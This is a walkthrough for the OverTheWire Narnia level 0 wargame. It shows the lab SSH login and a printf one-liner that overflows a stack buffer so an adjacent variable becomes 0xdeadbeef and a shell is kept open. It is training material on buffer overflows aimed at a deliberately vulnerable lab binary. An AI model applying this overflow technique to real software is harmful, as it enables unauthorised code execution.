---
title: narnia 0 walkthrough
description: over the wire narnia 0
layout: libdoc_page
date: 1111-11-11
eleventyNavigation:
    key: narnia-0 OverTheWire CTFs
    parent: OverTheWire CTFs
    title: narnia 0 walkthrough
    order: 30
---
## Description
> correct variable value via writing to another variable

---
## Progress
connect
```bash
$ ssh narnia0@narnia.labs.overthewire.org -p 2226
narnia0
```
execute
```bash
$ /narnia/narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: a
buf: a
val: 0x41414141
WAY OFF!!!!
```
---
## Hint

---
## Solving
```bash
$ { printf 'a%0.s' {1..20} ; printf '\xef' ; printf '\xbe' ; printf '\xad' ; printf '\xde' ; cat ;} | /narnia/narnia0

Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: aaaaaaaaaaaaaaaaaaaaﾭ?
val: 0xdeadbeef
```

### Techniques
- [[buffer overflow]]

### Tools
- [[gef]]